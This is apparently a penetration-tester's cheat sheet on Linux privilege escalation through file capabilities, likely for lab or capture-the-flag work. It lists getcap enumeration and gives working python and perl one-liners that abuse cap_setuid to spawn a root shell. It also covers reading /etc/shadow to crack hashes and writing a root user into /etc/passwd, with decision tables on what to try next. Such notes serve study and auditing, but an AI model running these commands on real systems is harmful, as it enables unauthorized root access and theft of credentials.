# 🐧 Linux Capabilities

> Capabilities grant slices of root power to specific binaries without the SUID bit. `cap_setuid` on an interpreter = **instant root**. Easy to miss because these binaries don't show up in a SUID search.

Part of [[Linux Privilege Escalation]]. Related: [[SUID & SGID]] · [[Sudo Abuse]]

---

## 🧠 THINK
- Run `getcap -r /` — separate from SUID enumeration.
- The dangerous one is **`cap_setuid`** (and `cap_setgid`) on `python`/`perl`/`ruby`/`php`/custom binaries.
- Others (`cap_dac_read_search`, `cap_dac_override`) allow **arbitrary file read/write** → read `/etc/shadow` or write `/etc/passwd`.
- Check GTFOBins ("Capabilities") for the exact payload per binary.

## ⚡ DETECT
```bash
getcap -r / 2>/dev/null
```
**Look for:** `= cap_setuid+ep`, `cap_setuid,cap_setgid+ep`, `cap_dac_read_search+ep`, etc. on a non-standard binary.

## 💥 EXPLOIT
**`cap_setuid` on python:**
```bash
/usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```
**`cap_setuid` on perl:**
```bash
/usr/bin/perl -e 'use POSIX qw(setuid); setuid(0); exec "/bin/bash";'
```
**`cap_dac_read_search` (read any file) → grab shadow:**
```bash
/path/binary /etc/shadow        # per GTFOBins read payload; then crack with hashcat
```
**`cap_dac_override` (write any file) → add root user:** write to `/etc/passwd` per [[Writable Files & PATH Hijack]].

> For any binary+capability combo, use its **GTFOBins Capabilities** entry.

## 🔁 FOUND → NEXT
| FINDING | NEXT |
|---|---|
| `cap_setuid` on python/perl/… | setuid(0) + shell → root |
| `cap_dac_read_search` | read `/etc/shadow` → crack ([[Credential Attacks]]) |
| `cap_dac_override` | write `/etc/passwd` UID-0 user → [[Writable Files & PATH Hijack]] |
| Custom binary w/ cap | GTFOBins Capabilities payload |

## 🚧 FAILED → NEXT
| Problem | Do this |
|---|---|
| `getcap` returns nothing | no capability path — pivot to [[Sudo Abuse]]/[[SUID & SGID]]/[[Cron Jobs]] |
| Cap present but not exploitable directly | file-read caps → read shadow/keys; combine with cracking |
| `getcap` not installed | search manually or run linpeas (it reports caps) |

## 📇 CHEAT SHEET
```bash
getcap -r / 2>/dev/null
```
```bash
python3 -c 'import os;os.setuid(0);os.system("/bin/bash")'    # cap_setuid on python
```
**Kill shot:** `cap_setuid` → `setuid(0)` → root.
